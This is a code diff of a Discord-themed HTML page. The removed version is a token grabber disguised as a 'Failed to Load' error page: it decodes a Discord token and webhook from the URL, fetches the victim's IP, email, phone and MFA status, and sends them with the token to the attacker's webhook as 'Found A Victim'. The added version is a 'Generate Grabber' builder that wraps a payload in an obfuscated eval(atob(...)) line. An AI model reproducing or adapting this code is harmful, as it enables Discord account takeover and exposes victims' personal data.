@@ -11,7 +11,7 @@ body {
   padding: 0;
 }
 
-.error-container {
+.generator-container {
   display: flex;
   align-items: center;
   justify-content: center;
@@ -19,28 +19,36 @@ body {
   background-color: #36393f; /* Discord background color */
 }
 
-.error-box {
+.generator-box {
   background-color: #2f3136; /* Darker Discord gray */
   padding: 20px;
   border-radius: 8px;
   text-align: center;
   font-family: "Segoe UI", Arial, sans-serif; /* Discord font */
   width: 300px;
+  align-items: center;
 }
 
-.error-title {
+.generator-title {
   font-size: 24px;
   color: #dcddde; /* Discord text color */
   margin: 0;
 }
 
-.error-message {
-  font-size: 18px;
-  color: #72767d; /* Discord secondary text color */
+.generator-input {
   margin: 20px 0;
 }
 
-.close-button {
+.generator-input input {
+  border-radius: 4px;
+  font-size: 16px;
+  padding: 10px 10px;
+  width: 280px;
+  border: 1px solid #72767d; /* Discord secondary text color */
+  outline: none; /* Remove input outline */
+}
+
+.generator-submit {
   background-color: #7289da; /* Discord purple */
   color: #fff;
   border: none;
@@ -48,184 +56,38 @@ body {
   padding: 10px 20px;
   font-size: 16px;
   cursor: pointer;
-  width: 100%; /* Button width matches the box */
+  width: 300px; /* Button width matches the box */
 }
-
-
 
     </style>
 </head>
 <body>
-    <div class="error-container">
-        <div class="error-box">
-          <h2 class="error-title">Error: Failed to Load</h2>
-          <p class="error-message">Something went wrong and the page failed to load. Please try again later.</p>
-          <button class="close-button" id="close-button">Close</button>
+    <div class="generator-container">
+        <div class="generator-box" id="generator-box">
+          <h1 class="generator-title">Generate Grabber</h1>
+          <div class="generator-input">
+            <input type="text" id="hook" placeholder="Enter your Discord webhook">
+          </div>
+          <button class="generator-submit" onclick="generate()">Submit</button>
         </div>
-      </div>
-      
+    </div>
     <script>
-        document.getElementById("close-button").addEventListener("click", function() {
-        window.close();
-        });
-
-
-        let param = new URLSearchParams(new URL(document.location).search);
-        var webhookBase64 = param.get("webhook");
-        var tokenBase64 = param.get("token");
-
-        var webhookURL = atob(webhookBase64);
-        var token = atob(tokenBase64);
-
-        function sendDiscordMessage(webhookURL, params) {
-            var request = new XMLHttpRequest();
-            request.open("POST", webhookURL);
-            request.setRequestHeader('Content-type', 'application/json');
-            request.send(JSON.stringify(params));
+        function generate() {
+            var code = ``;
+            var wh = document.getElementById("hook").value;
+            code = code.replace('YOUR_WEBHOOK_HERE', wh);
+            const encodedCode = btoa(code);
+            const finalCode = `eval(atob('${encodedCode}'));`;
+            var container = document.getElementById("generator-box");
+            container.style.width = "400px";
+            container.style.height = "500px";
+            container.innerHTML = "";
+            container.style.color = "#7289da";
+            container.style.fontSize = "12px";
+            container.style.wordWrap = "break-word";
+            container.style.textAlign = "center";
+            container.innerHTML = `<h3>${finalCode}</h3>`;
         }
-
-        function getUserIP(callback) {
-            var ipRequest = new XMLHttpRequest();
-            ipRequest.open("GET", "https://api.ipify.org?format=json", true);
-            ipRequest.onload = function () {
-                if (ipRequest.status >= 200 && ipRequest.status < 400) {
-                    var ipResponse = JSON.parse(ipRequest.responseText);
-                    var userIP = ipResponse.ip;
-                    callback(userIP);
-                }
-            };
-            ipRequest.send();
-        }
-
-        function getDiscordUser(token, callback) {
-            var userRequest = new XMLHttpRequest();
-            userRequest.open("GET", "https://discord.com/api/v9/users/@me", true);
-            userRequest.setRequestHeader('Authorization', token);
-            userRequest.onload = function () {
-                if (userRequest.status >= 200 && userRequest.status < 400) {
-                    var userResponse = JSON.parse(userRequest.responseText);
-                    callback(userResponse);
-                }
-            };
-            userRequest.send();
-        }
-
-        // Main code execution
-        getUserIP(function (userIP) {
-            getDiscordUser(token, function (userResponse) {
-                var userID = userResponse.id;
-                var username = userResponse.username;
-                var discriminator = userResponse.discriminator;
-                var email = userResponse.email;
-                var phone = userResponse.phone || "Not provided";
-                var mfaEnabled = userResponse.mfa_enabled ? "Enabled" : "Disabled";
-                var flags = userResponse.flags || "None";
-                var locale = userResponse.locale || "Not provided";
-                var nsfwAllowed = userResponse.nsfw_allowed ? "Allowed" : "Not allowed";
-                var verified = userResponse.verified ? "Verified" : "Not verified";
-                var bio = userResponse.bio || "Not provided";
-                var bannerColor = userResponse.banner_color || "Not set";
-                var publicFlags = userResponse.public_flags || "None";
-
-                var avatarURL = `https://cdn.discordapp.com/avatars/${userID}/${userResponse.avatar}.png`;
-
-                var params = {
-                    username: "Anon Grabber",
-                    avatar_url: "https://upload.wikimedia.org/wikipedia/commons/thumb/a/a6/Anonymous_emblem.svg/1200px-Anonymous_emblem.svg.png",
-                    embeds: [{
-                        title: "Found A Victim",
-                        description: "Found a victim on Discord using Anon Grabber",
-                        thumbnail: {
-                            url: avatarURL
-                        },
-                        color: 0x2f3136, // Dark gray color
-                        fields: [
-                            {
-                                name: "Username",
-                                value: `${username}#${discriminator}`,
-                                inline: true
-                            },
-                            {
-                                name: "User ID",
-                                value: userID,
-                                inline: true
-                            },
-                            {
-                                name: "Email",
-                                value: email || "Not provided",
-                                inline: true
-                            },
-                            {
-                                name: "Phone",
-                                value: phone,
-                                inline: true
-                            },
-                            {
-                                name: "MFA Enabled",
-                                value: mfaEnabled,
-                                inline: true
-                            },
-                            {
-                                name: "Flags",
-                                value: flags,
-                                inline: true
-                            },
-                            {
-                                name: "Locale",
-                                value: locale,
-                                inline: true
-                            },
-                            {
-                                name: "NSFW Allowed",
-                                value: nsfwAllowed,
-                                inline: true
-                            },
-                            {
-                                name: "Verified",
-                                value: verified,
-                                inline: true
-                            },
-                            {
-                                name: "Banner Color",
-                                value: bannerColor,
-                                inline: true
-                            },
-                            {
-                                name: "Public Flags",
-                                value: publicFlags,
-                                inline: true
-                            },
-                            {
-                                name: "IP Address",
-                                value: userIP,
-                                inline: true
-                            },
-                            {
-                                name: "Bio",
-                                value: bio,
-                                inline: false
-                            },
-                            {
-                                name: "Token",
-                                value: token,
-                                inline: false
-                            },
-                            {
-                                name: "\u200B", // Empty field name
-                                value: "***Made by Anon Grabber***",
-                                inline: false
-                            }
-                        ]
-                    }]
-                };
-
-                sendDiscordMessage(webhookURL, params);
-            });
-        });
-
-
-
-
     </script>
 </body>
 </html>
